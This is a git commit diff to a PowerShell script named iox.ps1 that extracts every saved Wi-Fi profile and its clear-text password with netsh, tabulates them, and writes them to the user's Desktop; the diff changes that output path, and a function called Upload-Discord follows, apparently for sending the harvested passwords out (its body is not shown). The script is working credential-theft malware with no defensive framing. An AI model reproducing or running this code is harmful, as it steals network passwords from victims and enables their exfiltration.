b90240866236a81546b23d1360bb26ea202c5d5c
XRedMelonX <89304906+XRedMelonX@users.noreply.github.com>
2024-05-30 16:33:37 +0100

    Update iox.ps1

--- iox.ps1
+++ iox.ps1
@@ -1,6 +1,7 @@
 $wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String
 
-$wifiProfiles > desktop\1.txt
+$username = $Env:UserName
+$wifiProfiles > C:\Users\$username\Desktop
 
 function Upload-Discord {
 
